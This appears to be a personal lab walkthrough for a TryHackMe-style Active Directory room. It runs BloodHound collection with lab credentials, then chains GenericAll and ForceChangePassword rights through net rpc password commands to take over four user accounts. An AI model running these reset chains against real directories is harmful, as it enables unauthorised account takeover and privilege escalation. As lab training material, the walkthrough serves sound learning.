BloodHound uses graph theory to model the relationships within an Active Directory environment. It ingests data about users, groups, computers, sessions, and ACLs (Access Control Lists) to create a graph that represents all possible attack paths.

More info about installation and execution [here](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce).

Since you have credentials, we can run `bloodhound` to get the Active Directory structure for this environment :

 `bloodhound-python -d thm.corp -u 'AUTOMATE' -p 'Passw0rd1' -ns MACHINE IP -c All`

![[Screenshot from 2024-08-19 19-27-32.png]]

You'll get 7 `json` files :

![[Screenshot from 2024-08-12 19-35-27.png]]

## neo4j

More info about [[Neo4j]].\

- Run neo4j:

	`neo4j console`
	
	![[Screenshot from 2024-08-12 20-09-36.png]]
- Browse http://localhost:7474.

	![[Screenshot from 2024-08-12 20-00-25.png]]
	Credentials: neo4j:neo4j

## Bloodhound execution

- Run Bloodhound.
	`bloodhound`
	
	![[Screenshot from 2024-08-12 20-20-45.png]]
	Credentials: neo4j:neo4j

- Click on  the **Upload data** button.
	![[Screenshot from 2024-08-12 20-35-09.png]]
	
- Select all the json files created previously and click Open.
	![[Screenshot from 2024-08-12 20-37-24.png]]
	![[Screenshot from 2024-08-13 20-17-31.png]]
- Once all the files have been imported click on Refresh.![[Screenshot from 2024-08-13 20-11-17.png]]


### Transitive Object Control

Transitive Object Control are objects this user can gain control of by performing ACL-only-based attacks in Active Directory. It's represented as a number. In other words, the maximum it is the number of objects the user can gain control of without needing to pivot to any other system in the network, just by manipulating objects in the directory

- Select the node for `TABATHA_BRITT` and display all `Transitively Controllable Objects`.
	![[Screenshot from 2024-08-13 20-58-38.png]]
	![[Screenshot from 2024-08-13 21-31-00.png]]
	You have:
	`GenericAll` from `TABATHA_BRITT` to `SHAWMA_BRAY`.
	
	`ForceChangePassword` from `SHAWMA_BRAY` to `CRUZZ_HALL`.
	
	`GenericWrite` from `CRUZ_HALL` to `DARLA_WINTERS`.

	This means we have a chance to own all these users by resetting their passwords, let's break it down :
	- Use `TABATHA_BRITT` to reset the password of `SHAWNA_BRAY`.
	- then  use `SHAWNA_BRAY` to reset the password of `CRUZ_HALL`.
	- finally use `CRUZ_HALL` to reset the password of `DARLA_WINTERS`.

### Changing  and resetting passwords
In bloodhound, if you right click on one of the arrows that contains the `rights` you have on other users, you get a help section that contains techniques you could use to take advantage of those rights :

#### Changing SHAWNA_BRAY's password using TABATHA_BRITT's credentials


`net rpc password 'SHAWNA_BRAY' 'Password@2020' -U thm.corp/'TABATHA_BRITT'%'marlboro(1985)' -S \<MACHINE IP>`


Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.

![[Screenshot from 2024-08-15 20-18-54.png]]
#### SHAWNA_BRAY\@THM.CORP -> ForceChangePassword -> CRUZZ_HALL\@THM.CORP

The **ForceChangePassword** permission allows us (in this case SHAWNA_BRAY\@THM.CORP) to reset a user's password without knowing their current password. So this user can reset CRUZZ_HALL\@THM.CORP's password.

`net rpc password 'CRUZ_HALL' 'Password@2021' -U thm.corp/'SHAWNA_BRAY'%'Password@2020' -S \<MACHINE IP>`  

Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.

![[Screenshot from 2024-08-15 20-43-32.png]]

#### CRUZ_HALL\@THM.CORP\ -> ForceChangePassword -> DARLA_WINTERS\@THM.CORP

Same as above, this time CRUZZ_HALL\@THM.CORP can reset DARLA_WINTERS\@THM.CORP's password.

`net rpc password 'DARLA_WINTERS' 'Password@2022' -U thm.corp/'CRUZ_HALL'%'Password@2021' -S \<MACHINE IP>` 

Now, you have five owned users :

```undefined
AUTOMATE
TABATHA_BRITT
SHAWNA_BRAY
CRUZ_HALL
DARLA_WINTERS
```

**Next step:** [[Delegation]]